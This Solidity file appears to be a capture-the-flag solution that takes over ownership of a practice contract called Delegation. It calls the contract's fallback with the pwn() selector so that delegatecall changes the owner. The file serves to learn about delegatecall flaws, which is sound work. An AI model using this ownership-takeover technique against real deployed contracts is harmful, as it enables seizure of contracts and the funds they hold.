// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public delegation;

    constructor(address _delegation) {
        delegation = _delegation;
    }

    /* Call fallback in Delegation, run the delegate call and then
    the pwn function in Delegation, which changes the owner to... 
    msg.sender = AttackingDelegation */
    function hackContract() external {
        delegation.call(abi.encodeWithSignature("pwn()"));
    }
}
